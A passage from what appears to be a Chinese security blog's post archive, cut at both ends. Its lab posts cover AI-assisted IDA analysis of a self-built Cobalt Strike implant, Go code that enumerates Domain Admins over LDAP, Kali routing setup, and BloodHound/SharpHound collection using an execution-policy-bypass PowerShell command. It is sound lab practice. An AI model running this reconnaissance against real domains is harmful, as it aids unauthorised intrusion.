<li><p>怀疑是ida-pro-mcp的服务没连接上，因为我看别人文章说要安装python3.12版本，我之前执行过3.12的ida-pro-mcp安装，所以卸载python3.12，并且删除相关的环境变量，重新安装ida-pro-mcp，再执行ida-pro-mcp –install，看见如下输出就好了。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007192505961.png" alt="image-20251007192505961"></p>
</li>
<li><p>继续返回聊天页面，输入提示词“ida打开了一个文件，这是一道ctf题目，请尝试帮我找出flag”，可以看到成功分析出flag。</p>
</li>
</ol>
<h2 id="进行cobaltstrike木马分析"><a href="#进行cobaltstrike木马分析" class="headerlink" title="进行cobaltstrike木马分析"></a>进行cobaltstrike木马分析</h2><ol>
<li>先用cobaltstrike生成exe木马。</li>
<li>把exe木马程序拖进ida，打开mcp插件。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007192936415.png" alt="image-20251007192936415"></li>
<li>聊天输入提示词“ida打开了一个exe木马文件，请尝试帮我分析出木马的基本功能和木马的c2服务器ip地址”，ai开始自动分析，结果如图。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007193705894.png" alt="image-20251007193705894"></li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ai貌似只能做一些基础的分析，例如字符串搜索，连最普通的cs马的c2服务器ip地址都分析不出来。最后附一张deepseek调用token的截图。分析两个程序花了0.08元。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007194145085.png" alt="image-20251007194145085"></p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>mcp</tag>
        <tag>自动化分析</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透-使用go实现域内管理员账户查询</title>
    <url>/2025/10/09/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8go%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%86%85%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol>
<li>go version go1.18.3 windows&#x2F;amd64</li>
<li>win2k8域控</li>
<li>win7域内主机</li>
</ol>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>go实现</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/go-ldap/ldap/v3&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 1. 连接与绑定 ==========</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bindAsAdmin</span><span class="params">(ldapURL, username, password <span class="type">string</span>)</span></span> *ldap.Conn &#123;</span><br><span class="line">	l, err := ldap.DialURL(ldapURL) <span class="comment">// 从命令行参数获取 LDAP URL</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;dial: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_, err = l.SimpleBind(&amp;ldap.SimpleBindRequest&#123;</span><br><span class="line">		Username: username, <span class="comment">// 从命令行参数获取</span></span><br><span class="line">		Password: password, <span class="comment">// 从命令行参数获取</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;bind: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 2. 根据组 DN 查成员 ==========</span></span><br><span class="line"><span class="comment">// 返回值改为 []string</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">queryGroupMembers</span><span class="params">(conn *ldap.Conn, groupDN <span class="type">string</span>)</span></span> []<span class="type">string</span> &#123;</span><br><span class="line">	search := ldap.NewSearchRequest(</span><br><span class="line">		groupDN,</span><br><span class="line">		ldap.ScopeBaseObject, ldap.NeverDerefAliases, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>,</span><br><span class="line">		<span class="string">&quot;(objectClass=*)&quot;</span>,</span><br><span class="line">		[]<span class="type">string</span>&#123;<span class="string">&quot;member&quot;</span>&#125;,</span><br><span class="line">		<span class="literal">nil</span>,</span><br><span class="line">	)</span><br><span class="line">	sr, err := conn.Search(search)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;search group: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sr.Entries) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sr.Entries[<span class="number">0</span>].GetAttributeValues(<span class="string">&quot;member&quot;</span>) <span class="comment">// []string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 3. 根据 DN 反查用户详情 ==========</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fetchUserDetail</span><span class="params">(conn *ldap.Conn, userDN <span class="type">string</span>)</span></span> (uid, display <span class="type">string</span>) &#123;</span><br><span class="line">	sr, err := conn.Search(ldap.NewSearchRequest(</span><br><span class="line">		userDN,</span><br><span class="line">		ldap.ScopeBaseObject, ldap.NeverDerefAliases, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>,</span><br><span class="line">		<span class="string">&quot;(objectClass=*)&quot;</span>,</span><br><span class="line">		[]<span class="type">string</span>&#123;<span class="string">&quot;sAMAccountName&quot;</span>, <span class="string">&quot;displayName&quot;</span>, <span class="string">&quot;mail&quot;</span>&#125;,</span><br><span class="line">		<span class="literal">nil</span>,</span><br><span class="line">	))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> || <span class="built_in">len</span>(sr.Entries) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;N/A&quot;</span>, <span class="string">&quot;N/A&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	e := sr.Entries[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">return</span> e.GetAttributeValue(<span class="string">&quot;sAMAccountName&quot;</span>), e.GetAttributeValue(<span class="string">&quot;displayName&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 4. 模糊搜组（可选） ==========</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findAdminGroupDN</span><span class="params">(conn *ldap.Conn, searchBase, keyword <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	search := ldap.NewSearchRequest(</span><br><span class="line">		searchBase, <span class="comment">// 从命令行参数获取搜索基础</span></span><br><span class="line">		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>,</span><br><span class="line">		fmt.Sprintf(<span class="string">&quot;(&amp;(objectClass=group)(cn=*%s*))&quot;</span>, ldap.EscapeFilter(keyword)),</span><br><span class="line">		[]<span class="type">string</span>&#123;<span class="string">&quot;dn&quot;</span>&#125;,</span><br><span class="line">		<span class="literal">nil</span>,</span><br><span class="line">	)</span><br><span class="line">	sr, err := conn.Search(search)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;search group: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(sr.Entries) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sr.Entries[<span class="number">0</span>].DN</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 定义命令行参数</span></span><br><span class="line">	ldapURL := flag.String(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;LDAP URL (e.g., ldap://win2k8dc.test.com:389)&quot;</span>)</span><br><span class="line">	username := flag.String(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;LDAP用户名（完整DN格式）&quot;</span>)</span><br><span class="line">	password := flag.String(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;LDAP密码&quot;</span>)</span><br><span class="line">	searchBase := flag.String(<span class="string">&quot;base&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;LDAP搜索基础（e.g., dc=test,dc=com)&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> *ldapURL == <span class="string">&quot;&quot;</span> || *username == <span class="string">&quot;&quot;</span> || *password == <span class="string">&quot;&quot;</span> || *searchBase == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;请提供有效的 LDAP URL、用户名、密码和搜索基础&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	conn := bindAsAdmin(*ldapURL, *username, *password)</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果已经知道组 DN，直接写死即可</span></span><br><span class="line">	<span class="comment">// domainAdminsDN := &quot;CN=Domain Admins,CN=Users,DC=example,DC=com&quot;</span></span><br><span class="line">	domainAdminsDN := findAdminGroupDN(conn, *searchBase, <span class="string">&quot;Domain Admins&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> domainAdminsDN == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;找不到 Domain Admins 组&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	members := queryGroupMembers(conn, domainAdminsDN)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;=== 组 \&quot;%s\&quot; 共 %d 位成员 ===\n&quot;</span>, domainAdminsDN, <span class="built_in">len</span>(members))</span><br><span class="line">	<span class="keyword">for</span> _, dn := <span class="keyword">range</span> members &#123;</span><br><span class="line">		uid, display := fetchUserDetail(conn, dn)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;DN: %s\n  sAMAccountName: %-15s  Display: %s\n&quot;</span>, dn, uid, display)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="测试使用"><a href="#测试使用" class="headerlink" title="测试使用"></a>测试使用</h2><ol>
<li>将代码保存为<code>ldapsearch.go</code></li>
<li>执行<code>go build .\ldapsearch.go</code>命令编译</li>
<li>将编译好的ldapsearch.exe文件传到win7主机上</li>
<li>在win7主机上打开cmd，执行查询命令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch.exe -url &quot;ldap://win2k8dc.test.com:389&quot; -username &quot;cn=administrator,cn=users,dc=test,dc=com&quot; -password &quot;win2k8dc.&quot; -base &quot;dc=test,dc=com&quot;</span><br></pre></td></tr></table></figure></li>
<li>已知域内有一个域管理员administrator，查询效果如图。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8go%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%86%85%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E6%9F%A5%E8%AF%A2/image-20251009185159605.png" alt="image-20251009185159605"></li>
</ol>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>这只是一个练习使用go的ldap库的程序。查询域管理员的前提条件是拥有一个域用户账号即可（不一定需要域管理员账号）。获取域内主机后，执行<code>net group &quot;Domain Admins&quot; /domain</code>即可查询域管理员账户。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8go%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%86%85%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E6%9F%A5%E8%AF%A2/image-20251009190050248.png" alt="image-20251009190050248"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>kali虚拟机配置双网卡连通内网外网</title>
    <url>/2025/10/09/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%BF%9E%E9%80%9A%E5%86%85%E7%BD%91%E5%A4%96%E7%BD%91/</url>
    <content><![CDATA[<h2 id="虚拟机添加两个网卡"><a href="#虚拟机添加两个网卡" class="headerlink" title="虚拟机添加两个网卡"></a>虚拟机添加两个网卡</h2><p>一个仅主机模式网卡，配置IP为10.10.10.100。一个网卡为NAT网卡，DHCP自动获取IP。</p>
<p><img src="/../images/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%BF%9E%E9%80%9A%E5%86%85%E7%BD%91%E5%A4%96%E7%BD%91/image-20251009195020016.png" alt="image-20251009195020016"><br>执行<code>ifconfig</code>查看IP信息。<img src="/../images/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%BF%9E%E9%80%9A%E5%86%85%E7%BD%91%E5%A4%96%E7%BD%91/image-20251009195146106.png" alt="image-20251009195146106"><br>执行<code>route</code>查看路由表信息，可以看到4条路由信息，其中第1条的Metric比较小，优先级高，所以先走了eth0网卡，也就是内网。<img src="/../images/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%BF%9E%E9%80%9A%E5%86%85%E7%BD%91%E5%A4%96%E7%BD%91/image-20251009201647486.png" alt="image-20251009201647486"></p>
<h2 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h2><ol>
<li>先删除第1条路由，执行<code>sudo route del default gw 192.168.40.2 eth1</code></li>
<li>重新添加Metric小于100的默认路由，执行<code>sudo route add default gw 192.168.40.2 dev eth1 metric 99</code>。配置好后如下图。<img src="/../images/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%BF%9E%E9%80%9A%E5%86%85%E7%BD%91%E5%A4%96%E7%BD%91/image-20251009202321259.png" alt="image-20251009202321259"></li>
<li>ping测试，可以看到内外网都能ping通。<img src="/../images/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%BF%9E%E9%80%9A%E5%86%85%E7%BD%91%E5%A4%96%E7%BD%91/image-20251009202411331.png" alt="image-20251009202411331"></li>
</ol>
<h2 id="配置重启生效"><a href="#配置重启生效" class="headerlink" title="配置重启生效"></a>配置重启生效</h2><h3 id="方法1：配置-etc-init-d"><a href="#方法1：配置-etc-init-d" class="headerlink" title="方法1：配置&#x2F;etc&#x2F;init.d"></a>方法1：配置&#x2F;etc&#x2F;init.d</h3><ol>
<li>将可执行脚本丢在<code>/etc/init.d</code>目录下，然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可</li>
<li>添加修改路由表的命令脚本。<code>sudo vim /etc/init.d/changeRoute.sh</code>。插入命令（注意这里不需要加sudo，启动脚本以root权限运行）:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route del default gw 192.168.40.2 eth1</span><br><span class="line">route add default gw 192.168.40.2 dev eth1 metric 99</span><br></pre></td></tr></table></figure></li>
<li>给脚本权限：<code>chmod 755 /etc/init.d/changeRoute.sh</code></li>
<li>建立软链接：<code>sudo ln -s /etc/init.d/changeRoute.sh /etc/rc3.d/changeRoute.sh</code></li>
<li>执行<code>sudo reboot</code>，重启再查看路由表是否更改。操了，我这里重启不生效。再试试其他方法。</li>
</ol>
<h3 id="方法2：配置-etc-rc-local"><a href="#方法2：配置-etc-rc-local" class="headerlink" title="方法2：配置&#x2F;etc&#x2F;rc.local"></a>方法2：配置&#x2F;etc&#x2F;rc.local</h3><ol>
<li>编辑自启动脚本，执行<code>sudo vim /etc/rc.local</code>，粘贴如下内容（开头必须是<code>#!/bin/bash</code>，结尾是<code>exit 0</code>，否则会报错）：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">route del default gw 192.168.40.2 eth1</span><br><span class="line">route add default gw 192.168.40.2 dev eth1 metric 99</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure></li>
<li>执行<code>sudo chmod +x /etc/rc.local</code>，添加执行权限。</li>
<li>先手动跑一遍，看是否存在错误。执行<code>sudo /etc/rc.local</code></li>
<li>重启服务验证。执行<code>sudo systemctl restart rc-local.service</code>和<code>sudo systemctl status rc-local.service</code>返回如下图则为成功。<img src="/../images/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%BF%9E%E9%80%9A%E5%86%85%E7%BD%91%E5%A4%96%E7%BD%91/image-20251009210641603.png" alt="image-20251009210641603"></li>
<li>执行<code>sudo reboot</code>，重启再查看路由表是否更改。重启后Metric修改为99，自启动修改成功。<img src="/../images/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%BF%9E%E9%80%9A%E5%86%85%E7%BD%91%E5%A4%96%E7%BD%91/image-20251009210754323.png" alt="image-20251009210754323"></li>
</ol>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透-bloodhound安装及简单使用</title>
    <url>/2025/10/09/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>域控主机win2k8（IP：10.10.10.1）</li>
<li>域内主机win7（IP：10.10.10.2）</li>
<li>攻击机kali（IP：10.10.10.100）</li>
</ol>
<h2 id="kali上安装bloodhound"><a href="#kali上安装bloodhound" class="headerlink" title="kali上安装bloodhound"></a>kali上安装bloodhound</h2><ol>
<li><p>执行<code>sudo apt update &amp;&amp; sudo apt install -y bloodhound</code><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009192933988.png" alt="image-20251009192933988"></p>
</li>
<li><p>安装好后执行<code>bloodhound</code>，出现提示询问是否第一次安装使用。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009193042112.png" alt="image-20251009193042112"></p>
</li>
<li><p>输入Y，回车，自动配置。并给出信息。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009193201814.png" alt="image-20251009193201814"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> It seems it&#x27;s the first time you run bloodhound</span><br><span class="line"></span><br><span class="line"> Please run bloodhound-setup first</span><br><span class="line"></span><br><span class="line">Do you want to run bloodhound-setup now? [Y/n] Y</span><br><span class="line"></span><br><span class="line"> [*] Starting PostgreSQL service</span><br><span class="line"></span><br><span class="line"> [*] Creating Database</span><br><span class="line"></span><br><span class="line"> Creating database user</span><br><span class="line"></span><br><span class="line"> Creating database</span><br><span class="line">ALTER ROLE</span><br><span class="line"></span><br><span class="line"> [*] Starting neo4j</span><br><span class="line">Neo4j is not running.</span><br><span class="line">Directories in use:</span><br><span class="line">home:         /usr/share/neo4j</span><br><span class="line">config:       /usr/share/neo4j/conf</span><br><span class="line">logs:         /etc/neo4j/logs</span><br><span class="line">plugins:      /usr/share/neo4j/plugins</span><br><span class="line">import:       /usr/share/neo4j/import</span><br><span class="line">data:         /etc/neo4j/data</span><br><span class="line">certificates: /usr/share/neo4j/certificates</span><br><span class="line">licenses:     /usr/share/neo4j/licenses</span><br><span class="line">run:          /var/lib/neo4j/run</span><br><span class="line">Starting Neo4j.</span><br><span class="line">Started neo4j (pid:73800). It is available at http://localhost:7474</span><br><span class="line">There may be a short delay until the server is ready.</span><br><span class="line"></span><br><span class="line"> [i] You need to change the default password for neo4j</span><br><span class="line">     Default credentials are user:neo4j password:neo4j</span><br><span class="line"></span><br><span class="line"> [!] IMPORTANT: Once you have setup the new password, please update /etc/bhapi/bhapi.json with the new password before running bloodhound</span><br><span class="line">.......................................</span><br><span class="line"> opening http://localhost:7474/</span><br></pre></td></tr></table></figure></li>
<li><p>关注的信息是账号密码<code>user:neo4j password:neo4j</code></p>
</li>
<li><p>访问<code>http://localhost:7474/browser/</code>输入默认的账号密码。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009193526818.png" alt="image-20251009193526818"></p>
</li>
<li><p>登录后需要重置密码，我重置密码为<code>neo4j2</code>。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009193645466.png" alt="image-20251009193645466"></p>
</li>
<li><p>修改密码成功后，进入如下界面说明配置数据库成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009193737762.png" alt="image-20251009193737762"></p>
</li>
<li><p>下载可执行文件。（<a href="https://github.com/BloodHoundAD/BloodHound/releases%EF%BC%89![image-20251009211820400](../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009211820400.png)">https://github.com/BloodHoundAD/BloodHound/releases）![image-20251009211820400](../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009211820400.png)</a></p>
</li>
<li><p>下载后解压，进到工作目录，执行<code>./BloodHound --no-sandbox</code>看到如下界面即成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009212035107.png" alt="image-20251009212035107"></p>
</li>
<li><p>使用上面步骤修改过的账号密码登录。进去之后一片空白。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009212131807.png" alt="image-20251009212131807"></p>
</li>
</ol>
<h2 id="采集数据并导入bloodhound"><a href="#采集数据并导入bloodhound" class="headerlink" title="采集数据并导入bloodhound"></a>采集数据并导入bloodhound</h2><ol>
<li>下载收集器。（<a href="https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors%EF%BC%89">https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors）</a></li>
<li>以exe收集器为例，下载后复制到域内主机win7上，打开命令行执行发现缺少.net。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009212504640.png" alt="image-20251009212504640"></li>
<li>下载.net 4.0（<a href="https://www.microsoft.com/zh-cn/download/details.aspx?id=17718%EF%BC%89">https://www.microsoft.com/zh-cn/download/details.aspx?id=17718）</a></li>
<li>安装.net。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009212706261.png" alt="image-20251009212706261"></li>
<li>安装完后，再次执行<code>SharpHound.exe -c all</code>，tmd报错，试试powershell收集器。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009213100395.png" alt="image-20251009213100395"></li>
<li>执行<code>powershell -exec bypass -command &quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</code><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009213330576.png" alt="image-20251009213330576"></li>
<li>也报错了，看别人文章说用旧版本的收集器。（<a href="https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors%EF%BC%89">https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors）</a></li>
<li>下载好旧版的exe收集器后，执行<code>SharpHound-old.exe -c all</code>还是报错。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009213706583.png" alt="image-20251009213706583"></li>
<li>测试使用旧版ps收集器，也报错了。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009214013870.png" alt="image-20251009214013870"><br>  有空再继续搞。</li>
<li>可能是.net版本过低，下载4.8版本测试（<code>https://dotnet.microsoft.com/en-us/download/dotnet-framework/thank-you/net48-offline-installer</code>）（注意：某些旧系统（如 Windows 7）需先打补丁（KB2999226、KB2670838 等）才能装 4.7.2+）。补丁下载地址（<code>https://www.microsoft.com/zh-cn/download/details.aspx?id=36805</code>、<code>https://www.microsoft.com/zh-cn/download/details.aspx?id=49093</code>）</li>
<li>安装补丁，安装完毕后重启。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009220306681.png" alt="image-20251009220306681"></li>
<li>查看补丁安装情况。执行<code>systeminfo | findstr 2999226</code>和<code>systeminfo | findstr 2670838</code>。查看到如图补丁信息即为安装成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009220823719.png" alt="image-20251009220823719"></li>
<li>安装.net4.8，安装失败，暂时不搞了。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009221101460.png" alt="image-20251009221101460"></li>
<li>尝试安装.net4.6，需要域管理员权限，真实环境直接GG，这里是测试环境，直接输入账号密码安装。（<a href="https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net46%EF%BC%89![image-20251009224026360](../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009224026360.png)">https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net46）![image-20251009224026360](../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009224026360.png)</a></li>
